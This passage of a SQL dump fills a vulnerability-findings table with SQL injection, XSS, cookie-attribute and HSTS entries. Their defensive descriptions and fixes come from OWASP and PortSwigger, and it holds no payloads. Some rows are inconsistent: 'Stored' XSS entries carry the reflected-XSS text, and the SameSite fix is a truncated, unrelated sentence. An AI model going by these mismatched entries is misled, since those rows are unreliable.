second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 92, 'High'),
(370, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 92, 'High'),
(371, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 92, 'Low'),
(372, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 92, 'Low'),
(373, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 92, 'Low'),
(374, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 92, 'Low'),
(375, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 93, 'High'),
(376, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 93, 'High'),
(377, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 93, 'Low'),
(378, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 93, 'Low'),
(379, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 93, 'Low'),
(380, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 93, 'Low'),
(381, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 94, 'High'),
(382, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 94, 'High'),
(383, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 94, 'Low'),
(384, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 94, 'Low'),
(385, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 94, 'Low'),
(386, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 94, 'Low'),
(387, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 95, 'High'),
(388, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 95, 'High'),
(389, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 95, 'Low'),
(390, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 95, 'Low'),
(391, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 95, 'Low'),
(392, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 95, 'Low'),
(393, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 96, 'High'),
(394, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 96, 'High'),
(395, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 96, 'Medium');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(396, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 96, 'Low'),
(397, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 96, 'Low'),
(398, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 96, 'Low'),
(399, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 96, 'Low'),
(400, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 97, 'High'),
